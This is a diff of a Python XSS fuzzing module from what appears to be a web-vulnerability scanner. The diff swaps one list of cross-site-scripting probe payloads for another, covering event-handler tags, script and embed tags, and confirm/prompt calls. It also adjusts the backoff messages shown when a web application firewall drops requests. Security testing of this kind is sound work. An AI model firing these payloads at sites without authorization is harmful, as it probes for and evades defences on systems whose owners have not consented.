@@ -14,12 +14,12 @@ bad = '\033[91m[-]\033[0m'
 run = '\033[97m[~]\033[0m'
 
 # "Not so malicious" payloads for fuzzing
-fuzzes = ['<z oNxXx=yyy>', '<z xXx=yyy>', '<z o%00nload=yyy>', '<z oNStart=confirm()>', '<z oNMousEDown=(((confirm)))()>', '<z oNMousEDown=(prompt)``>', '<EmBed sRc=//14.rs>',
-'<EmBed sRc=\/\\14.rs>', '<z oNMoUseOver=yyy>', '<z oNMoUsedoWn=yyy>', '<z oNfoCus=yyy>', '<z oNsUbmit=yyy>', '<z oNToggLe=yyy>', '<z oNoRieNtATionChaNge=yyy>', '<z OnReaDyStateChange=yyy>',
-'<z oNbEfoReEdiTFoCus=yyy>', '<z oNDATAsEtChangeD=yyy>', '<sVG x=y>', '<bODy x=y>', '<emBed x=y>', '<aUdio x=y>', '<sCript x=y z>', '<iSinDEx x=y>',
-'<deTaiLs x=y>', '<viDeo x=y>', '<MaTh><x:link>', 'x<!--y-->z', '<test>', '<script>String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 41)</script>',
-'">payload<br attr="', '&#x3C;script&#x3E;', '<r sRc=x oNError=r>', '<x OnCliCk=(prompt)()>click',
-'<bGsOund sRc=x>']
+fuzzes = ['<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
+'<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
+'<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
+'<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
+'<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
+'"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>']
 
 def fuzzer(url, param_data, method, delay, xsschecker, cookie):
     result = [] # Result of fuzzing
@@ -38,14 +38,14 @@ def fuzzer(url, param_data, method, delay, xsschecker, cookie):
                 r = requests.post(url, data=param_data_injected, timeout=10, cookies=cookie) # Seperating "param_data_injected" with comma because its POST data
             response = r.text
         except:
-            print ('\n%s WAF is dropping suspicious conncections.' % bad)
+            print ('\n%s WAF is dropping suspicious requests.' % bad)
             if delay == 0:
-                print ('%s Delay has been increased to %s6%s seconds' % (info, green, end))
+                print ('%s Delay has been increased to %s6%s seconds.' % (info, green, end))
                 delay += 6
             limit = (delay + 1) * 2
             timer = -1
             while timer < limit:
-                sys.stdout.write('\r%s Fuzzing will continue after %s%i%s seconds' % (info, green, limit, end))
+                sys.stdout.write('\r%s Fuzzing will continue after %s%i%s seconds.' % (info, green, limit, end))
                 sys.stdout.flush()
                 limit -= 1
                 sleep(1)
@@ -67,7 +67,6 @@ def fuzzer(url, param_data, method, delay, xsschecker, cookie):
             result.append({
                 'result' : '%sFiltered%s' % (yellow, end),
                 'fuzz' : i})
-
     table = PrettyTable(['Fuzz', 'Response']) # Creates a table with two columns
     for value in result:
         table.add_row([value['fuzz'], value['result']]) # Adds the value of fuzz and result to the columns
